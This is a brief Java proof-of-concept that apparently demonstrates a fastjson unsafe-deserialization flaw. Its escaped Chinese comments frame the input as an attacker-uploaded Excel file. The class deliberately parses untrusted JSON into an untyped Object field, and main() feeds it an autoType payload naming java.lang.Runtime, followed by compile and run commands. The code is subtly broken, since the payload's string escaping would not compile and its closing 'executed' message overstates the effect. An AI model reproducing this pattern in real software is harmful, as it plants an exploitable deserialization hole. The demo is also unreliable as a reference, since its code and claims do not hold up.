import com.alibaba.fastjson.JSON;
import java.io.Serializable;
import java.util.Map;

public class MLModel implements Serializable {
    private static final long serialVersionUID = 1L;
    private String modelName;
    private Object featureMap; // \u53ef\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e

    public void setColumnComment(String jsonInput) {
        MLModel model = JSON.parseObject(jsonInput, MLModel.class); // \u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316
        this.featureMap = model.featureMap;
    }

    public static void main(String[] args) {
        MLModel victim = new MLModel();
        String maliciousPayload = "{\\"featureMap\\":{\\"@type\\":\\"java.lang.Class\\",\\"val\\":\\"java.lang.Runtime\\"}}";
        
        // \u6a21\u62df\u653b\u51fb\u8005\u4e0a\u4f20\u7684恶\u610fExcel\u6587\u4ef6\u5185\u5bb9
        victim.setColumnComment(maliciousPayload);
        
        System.out.println("Vulnerable deserialization executed");
    }
}
// \u4f9d\u8d56\u7f16\u8bd1\uff1ajavac -cp fastjson-1.2.83.jar MLModel.java
// \u8fd0\u884c\u547d\u4ee4\uff1ajava -cp .;fastjson-1.2.83.jar MLModel